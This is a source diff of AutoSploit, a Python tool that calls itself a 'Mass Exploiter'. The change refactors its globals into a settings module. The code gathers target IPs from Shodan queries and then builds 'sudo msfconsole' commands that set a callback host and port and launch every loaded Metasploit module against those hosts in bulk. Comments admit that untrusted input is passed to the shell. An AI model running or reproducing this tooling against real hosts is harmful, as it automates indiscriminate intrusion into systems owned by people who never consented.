@@ -29,44 +29,38 @@ import shodan
 # from retrying import retry
 from blessings import Terminal
 
-from lib.jsonize import load_exploits
+from lib.settings import (
+    QUERY,
+    WORKSPACE,
+    LOCAL_HOST,
+    LOCAL_PORT,
+    CONFIGURED,
+    TOOLBAR_WIDTH,
+    VERSION,
+    USAGE_AND_LEGAL_PATH,
+    LOADED_EXPLOITS,
+    AUTOSPLOIT_OPTS,
+    API_PATH,
+    get_token
+)
 
 
-t = Terminal()
-
-# Global vars
-api = ""
-query = ""
-workspace = ""
-local_port = ""
-local_host = ""
-configured = False
-toolbar_width = 60
-version = "1.4.0"
-usage_and_legal_path = "{}/etc/general".format(os.getcwd())
-loaded_exploits = load_exploits("{}/etc/json".format(os.getcwd()))
 stop_animation = False
-autosploit_opts = {
-    1: "usage and legal", 2: "gather hosts", 3: "custom hosts",
-    4: "add single host", 5: "view gathered hosts", 6: "exploit gathered hosts",
-    99: "quit"
-}
+t = Terminal()
 
 
 def logo(line_sep="#--", space=" " * 30):
     """Logo."""
-    global version
     print(t.cyan("""{space_sep}_____     _       _____     _     _ _
 {sep1}Author : Vector/NullArray |  _  |_ _| |_ ___|   __|___| |___|_| |_
 {sep1}Twitter: @Real__Vector    |     | | |  _| . |__   | . | | . | |  _|
 {sep1}Type   : Mass Exploiter   |__|__|___|_| |___|_____|  _|_|___|_|_|
 {sep1}Version: {v_num}                                    |_|
 ##############################################
-""".format(sep1=line_sep, v_num=version, space_sep=space)))
+""".format(sep1=line_sep, v_num=VERSION, space_sep=space)))
 
 
 def animation(text):
-    global stop_animation
     i = 0
     while not stop_animation:
         temp_text = list(text)
@@ -84,10 +78,9 @@ def animation(text):
 
 def usage():
     """Usage & Legal."""
-    global usage_and_legal_path
     print("\033[H\033[J")  # Clear terminal
     logo()
-    with open(usage_and_legal_path) as info:
+    with open(USAGE_AND_LEGAL_PATH) as info:
         print(info.read())
 
 
@@ -113,11 +106,8 @@ def cmdline(command):
 def exploit(query=None, single=None):
     """Exploit component"""
 
-    global workspace
-    global local_port
-    global local_host
-    global loaded_exploits
     global stop_animation
+
     print("\033[H\033[J")  # Clear terminal
 
     logo()
@@ -139,7 +129,7 @@ def exploit(query=None, single=None):
             thread.daemon = True
             thread.start()
 
-            for mod in loaded_exploits:
+            for mod in LOADED_EXPLOITS:
                 all_modules.append(mod)
 
             stop_animation = True
@@ -147,9 +137,10 @@ def exploit(query=None, single=None):
             print("\n\n\n[{}]Done. Launching exploits.".format(t.green("+")))
             # TODO:/
             # exploit is not referenced anywhere around here
-            template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                workspace, local_host, local_port, rhosts, exploit)
-            cmdline(template)
+            for exploit in all_modules:
+                template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
+                    WORKSPACE, LOCAL_HOST, LOCAL_PORT, rhosts, exploit)
+                cmdline(template)
 
         elif proceed == 'n':
             print("[{}]Aborted. Returning to Main Menu".format(t.red("!")))
@@ -165,7 +156,7 @@ def exploit(query=None, single=None):
         thread.daemon = True
         thread.start()
 
-        for mod in loaded_exploits:
+        for mod in LOADED_EXPLOITS:
             all_modules.append(mod)
 
         stop_animation = True
@@ -187,7 +178,7 @@ def exploit(query=None, single=None):
                 for exploit in sorted_modules:
                     # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                     template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                        workspace, local_host, local_port, rhosts, exploit)
+                        WORKSPACE, LOCAL_HOST, LOCAL_PORT, rhosts, exploit)
                     cmdline(template)
     elif choice == 'a':
         with open("hosts.txt", "rb") as host_list:
@@ -195,7 +186,7 @@ def exploit(query=None, single=None):
                 for exploit in all_modules:
                     # WARNING: POTENTIAL SECURITY RISK - UNTRUSTED INPUT TO SHELL: (Fix by V1.5)
                     template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (
-                        workspace, local_host, local_port, rhosts, exploit)
+                        WORKSPACE, LOCAL_HOST, LOCAL_PORT, rhosts, exploit)
                     cmdline(template)
     else:
         print("[{}]Unhandled Option. Defaulting to Main Menu".format(t.red("!")))
@@ -203,10 +194,6 @@ def exploit(query=None, single=None):
 
 def settings(single=None):
     """Function to define Metasploit settings."""
-    global workspace
-    global local_port
-    global local_host
-    global configured
 
     print("\033[H\033[J")  # Clear terminal
     logo()
@@ -273,12 +260,12 @@ def settings(single=None):
             # in the 'gather hosts' function. We will check this string against the MSF
             # modules in order to sort out the most relevant ones with regards to the intended
             # targets.
-            exploit(query)
+            exploit(QUERY)
 
 
 def targets(clobber=True):
     """Function to gather target host(s) from Shodan."""
-    global query
+
     global stop_animation
 
     print("\033[H\033[J")  # Clear terminal
@@ -301,7 +288,7 @@ def targets(clobber=True):
     time.sleep(1)
 
     try:
-        result = api.search(query)
+        result = API.search(query)
     except Exception as e:
         print("\n[{}]Critical. An error was raised with the following error message.\n".format(
             t.red("!")))
@@ -315,7 +302,7 @@ def targets(clobber=True):
     # edit the clobber function to work properly
     if clobber:
         with open('hosts.txt', 'wb') as log:
-            for _ in xrange(toolbar_width):
+            for _ in xrange(TOOLBAR_WIDTH):
                 time.sleep(0.1)
                 for service in result['matches']:
                     log.write("{}{}".format(service['ip_str'], os.linesep))
@@ -328,7 +315,7 @@ def targets(clobber=True):
 
     else:
         with open("hosts.txt", "ab") as log:
-            for i in xrange(toolbar_width):
+            for i in xrange(TOOLBAR_WIDTH):
                 time.sleep(0.1)
                 for service in result['matches']:
                     log.write(service['ip_str'])
@@ -426,11 +413,6 @@ def single_target():
     elif IP == "127.0.0.1":
         print("[{}]Critical. Invalid IPv4 address.".format(t.red("!")))
     else:
-        # TODO:/
-        # host path is not referenced anywhere near here
-        print("\n[{}]Host set to {}".format(t.green("+"), repr(hostpath)))
-        time.sleep(1)
-
         print("\n\n[{}]Append the IP to the host file or pass to exploit module directly?.".format(
             t.green("+")))
         choice = raw_input(
@@ -444,7 +426,7 @@ def single_target():
             print("[{}]Host added to {}".format(t.green("+"), hostpath))
 
         elif choice == 'p':
-            if configured:
+            if CONFIGURED:
                 exploit(None, IP)
             else:
                 settings(IP)
@@ -455,10 +437,6 @@ def single_target():
 
 def main():
     """Main menu."""
-    global query
-    global configured
-    global api
-    global autosploit_opts
 
     # TODO:/
     # commenting this out for now, guessing we need to create a retry function
@@ -478,13 +456,13 @@ def main():
             # Make sure a misconfiguration in the MSF settings
             # Doesn't execute main menu loop but returns us to the
             # appropriate function for handling those settings
-            if configured is None:
+            if CONFIGURED is None:
                 settings()
 
             print("\n[{}]Welcome to AutoSploit. Please select an action.".format(
                 t.green("+")))
-            for i in autosploit_opts.keys():
-                print("{}. {}".format(i, autosploit_opts[i].title()))
+            for i in AUTOSPLOIT_OPTS.keys():
+                print("{}. {}".format(i, AUTOSPLOIT_OPTS[i].title()))
 
             action = raw_input("\n<" + t.cyan("AUTOSPLOIT") + ">$ ")
 
@@ -539,9 +517,9 @@ def main():
                     print("by selecting the 'Gather Hosts' option")
                     print("before executing the 'Exploit' module.")
 
-            if configured:
-                exploit(query)
-            elif configured is False:
+            if CONFIGURED:
+                exploit(QUERY)
+            elif CONFIGURED is False:
                 settings()
             elif action == '99':
                 print("\n[{}]Exiting AutoSploit...".format(t.red("!")))
@@ -620,12 +598,7 @@ if __name__ == "__main__":
     # We will check if the shodan api key has been saved before, if not we are going to prompt
     # for it and save it to a file
     if not os.path.isfile("api.p"):
-        print("\n[{}]Please provide your Shodan.io API key.".format(t.green("+")))
-
-        SHODAN_API_KEY = raw_input("API key: ")
-        pickle.dump(SHODAN_API_KEY, open("api.p", "wb"))
-        path = os.path.abspath("api.p")
-        print("[{}]\nYour API key has been saved to {}".format(t.green("+"), path))
+        SHODAN_API_KEY = get_token(API_PATH)
         main()
 
     else:
